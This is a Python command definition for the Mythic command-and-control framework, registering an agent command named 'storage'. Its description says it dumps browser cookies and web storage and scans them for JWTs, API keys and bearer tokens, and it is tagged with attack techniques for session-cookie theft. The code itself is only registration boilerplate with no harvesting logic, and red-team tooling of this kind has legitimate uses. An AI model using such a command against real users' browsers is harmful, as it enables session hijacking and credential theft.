from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class StorageArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class StorageCommand(CommandBase):
    cmd = "storage"
    needs_admin = False
    help_cmd = "storage"
    description = "Dump all browser storage: cookies, localStorage, sessionStorage, IndexedDB names. Auto-scans for JWTs, API keys, and bearer tokens."
    version = 1
    author = "@grampae"
    attackmapping = ["T1539", "T1005"]
    argument_class = StorageArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.MacOS, SupportedOS.Linux, SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
